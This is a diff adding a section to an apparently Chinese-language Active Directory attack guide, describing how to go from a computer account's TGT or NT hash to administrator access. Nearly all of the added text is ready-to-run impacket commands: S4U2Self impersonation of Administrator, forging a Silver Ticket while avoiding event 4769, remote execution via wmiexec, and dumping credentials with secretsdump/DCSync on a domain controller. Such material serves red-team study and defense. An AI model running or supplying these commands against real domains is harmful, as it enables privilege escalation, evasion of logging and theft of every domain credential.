@@ -209,6 +209,63 @@ S4U2Self + S4U2Proxy 流程:
      │    使用 Admin 的 ST   │                        │
 ```
 
+### 2.5 从计算机账户凭据到管理员 Shell
+
+获取计算机账户的 TGT 或 NT hash 后（通过 Shadow Credentials 或其他方式），有多种路径获取管理员权限。
+
+#### S4U2Self + altservice
+
+```bash
+# 使用计算机账户的 TGT 通过 S4U2Self 获取 Administrator 的服务票据
+export KRB5CCNAME=computer.ccache
+
+# -self: S4U2Self（为自己请求其他用户的 ST）
+# -altservice: 指定目标服务（CIFS 用于文件访问、HOST 用于 WMI/PsExec）
+impacket-getST -self -impersonate 'Administrator' \
+  -altservice 'CIFS/target.domain.local' \
+  -k -no-pass -dc-ip DC_IP 'domain.local'/'computer$'
+
+# 使用获取的 Administrator ST
+export KRB5CCNAME=Administrator@CIFS_target.domain.local@DOMAIN.LOCAL.ccache
+impacket-wmiexec -k -no-pass domain.local/Administrator@target.domain.local
+impacket-smbclient -k -no-pass target.domain.local
+```
+
+#### Silver Ticket
+
+```bash
+# 当拥有计算机账户的 NT hash 时，可以伪造 Silver Ticket
+# Silver Ticket 不经过 DC 验证 → 不产生 4769 事件
+
+# 1. 获取域 SID
+impacket-lookupsid 'domain.local'/'computer$'@target.domain.local 0 \
+  -hashes ':NTLM_HASH'
+
+# 2. 伪造 CIFS 服务的 Silver Ticket
+impacket-ticketer -domain-sid 'S-1-5-21-xxx-xxx-xxx' \
+  -domain 'domain.local' \
+  -spn 'CIFS/target.domain.local' \
+  -nthash 'NTLM_HASH' \
+  Administrator
+
+# 3. 使用伪造票据
+export KRB5CCNAME=Administrator.ccache
+impacket-wmiexec -k -no-pass domain.local/Administrator@target.domain.local
+impacket-secretsdump -k -no-pass target.domain.local
+```
+
+#### 域控的特殊情况
+
+```bash
+# 如果目标计算机是域控制器 → 获取其机器账户后可直接 DCSync
+# 使用 DC 机器账户 hash
+impacket-secretsdump -hashes ':NTLM_HASH' 'domain.local'/'DC01$'@dc01.domain.local
+
+# 或使用 DC 机器账户 TGT
+export KRB5CCNAME=dc01.ccache
+impacket-secretsdump -k -no-pass domain.local/'DC01$'@dc01.domain.local
+```
+
 ---
 
 ## 3. 组合攻击
